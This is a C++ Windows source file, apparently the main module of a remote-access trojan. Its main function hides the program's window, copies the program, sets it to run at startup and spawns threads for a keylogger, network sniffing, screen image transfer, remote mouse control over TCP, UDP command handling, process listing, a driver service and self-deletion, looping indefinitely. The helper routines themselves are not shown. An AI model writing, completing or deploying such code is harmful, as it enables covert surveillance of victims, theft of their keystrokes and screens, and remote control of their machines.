#include"main.h"


unsigned WINAPI Thread_Suicide(LPVOID v) 
{

	Suicide();
	_endthreadex(10);
	return 0;
}


unsigned WINAPI Thread_CurrentProgramCopy(LPVOID v) 
{

	CurrentProgramCopy();
	_endthreadex(10);
	return 0;
}

unsigned WINAPI Thread_SetAutoRun(LPVOID v) 
{
	SetAutoRun();
	return 0;
}
unsigned WINAPI Thread_Sniffing(LPVOID v) 
{

	Sniffing();
	_endthreadex(10);
	return 0;

}

unsigned WINAPI Thread_MouseRecvTcpSocket(LPVOID v)
{
	MouseRecvTcpSocket();					
	
	return 0;
}
unsigned WINAPI Thread_RecvfromUdpSocket (LPVOID v)
{

	RecvfromUdpSocket();
	_endthreadex(10);
	return 0;
}
unsigned WINAPI Thread_ProcessList(LPVOID v)
{
	ProcessList();
	_endthreadex(10);
	return 0;
}
unsigned WINAPI Thread_ImageTrans(LPVOID v)
{
	image_trans();
	_endthreadex(10);
	return 0;
}

unsigned WINAPI Thread_Keylogger(LPVOID v) 
{

	keylogger();
	_endthreadex(10);
	return 0;

}

unsigned WINAPI Thread_ConnectingList(LPVOID v) 
{
	ConnectingList();
	_endthreadex(10);
	return 0;
}

unsigned WINAPI Thread_DriverService(LPVOID v) 
{

	DriverService();

	_endthreadex(10);
	return 0;
}


int main()
{
	stealth(1);
	WSADATA wsadata;
	WSAStartup(MAKEWORD(2, 2), &wsadata);
	setlocale(LC_ALL, "korean");
	DWORD code = 0;
	Makesys();


	while (1) {
		
		HANDLE startthread[4] = { 0, };
		

		

		startthread[0] = (HANDLE)_beginthreadex(NULL, NULL, Thread_Suicide, NULL, NULL, NULL);
		startthread[1] = (HANDLE)_beginthreadex(NULL, NULL, Thread_CurrentProgramCopy, NULL, NULL, NULL);
		startthread[2] = (HANDLE)_beginthreadex(NULL, NULL, Thread_SetAutoRun, NULL, NULL, NULL);
		startthread[3] = (HANDLE)_beginthreadex(NULL, NULL, Thread_ConnectingList, NULL, NULL, NULL);
		sig();
		//???????????????????????????????????????????????????????

		HANDLE threadex[7] = { 0, };
		//threadex[0] = (HANDLE)_beginthreadex(NULL, NULL, Thread_ProcessList, NULL, NULL, NULL);
		threadex[0] = (HANDLE)_beginthreadex(NULL, NULL, Thread_MouseRecvTcpSocket, NULL, NULL, NULL);
		threadex[1] = (HANDLE)_beginthreadex(NULL, NULL, Thread_RecvfromUdpSocket, NULL, NULL, NULL);
		threadex[2] = (HANDLE)_beginthreadex(NULL, NULL, Thread_Sniffing, NULL, NULL, NULL);
		threadex[3] = (HANDLE)_beginthreadex(NULL, NULL, Thread_ProcessList, NULL, NULL, NULL);
		threadex[4] = (HANDLE)_beginthreadex(NULL, NULL, Thread_ImageTrans, NULL, NULL, NULL);
		threadex[5] = (HANDLE)_beginthreadex(NULL, NULL, Thread_Keylogger,NULL,NULL,NULL);
		threadex[6] = (HANDLE)_beginthreadex(NULL, NULL, Thread_DriverService, NULL, NULL, NULL);
		WaitForSingleObject(threadex[6], INFINITE);
		//WaitForMultipleObjectsEx(2, threadex, true, INFINITE, NULL);
		
		//ProcessList();

		/*for (int i = 0; i < 6; i++) {

			CloseHandle(threadex[i]);

		}*/
		/*for(int i=0;i<4;i++)
		{

			GetExitCodeThread(startthread[i],&code);
			CloseHandle(startthread[i]);

		}*/


		
		cout << "사이클 지나감" << endl;
		
	}
	WSACleanup();
	return 0;

}